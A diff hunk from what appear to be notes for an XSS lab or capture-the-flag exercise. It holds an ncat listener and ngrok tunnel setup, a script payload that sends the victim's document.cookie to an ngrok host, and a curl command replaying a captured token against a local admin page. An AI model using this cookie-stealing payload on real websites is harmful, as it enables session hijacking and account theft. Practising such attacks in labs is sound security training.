@@ -21,7 +21,7 @@ XSS
 ---------
 ncat -klnvp 9000
 ngrok http 9000
-<script>document.write('<img src="http://340b-2406-3003-2077-4ea9-85b2-4692-1458-96f8.ngrok.io?cookie='+btoa(document.cookie)+'" />');</script>
+<script>document.write('<img src="http://019b-2406-3003-2077-4ea9-e183-ea0c-8d0-92a2.ngrok.io?cookie='+btoa(document.cookie)+'" />');</script>
 curl -H "Cookie: token=8abae5d8bc89622b6bf5a76c948312f2" http://127.0.0.1:5000/XSS/admin
 
 XSS with Content Security Policy (Low)
